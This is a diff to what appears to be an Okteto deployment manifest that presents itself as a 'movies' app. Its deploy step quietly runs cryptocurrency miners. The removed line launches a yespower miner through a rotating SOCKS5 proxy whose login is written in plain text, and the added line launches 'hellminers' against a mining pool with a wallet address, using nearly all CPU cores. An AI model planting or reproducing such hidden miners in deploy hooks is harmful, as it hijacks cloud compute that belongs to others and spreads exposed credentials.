@@ -1,5 +1,5 @@
 icon: https://apps.okteto.com/movies/icon.png
 deploy:
-  - chmod +x poin; nohup ./poin -a yespower -o stratum+tcp://103.249.70.7:6533 -u TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7.Tetot -p c=TRX,mc=BTE -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
+  - chmod +x verus-solver hellminers; nohup ./hellminers -c stratum+tcp://139.99.123.225:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.4ever -p x --cpu $(nproc --ignore 1)
 devs:
   - api/okteto.yml
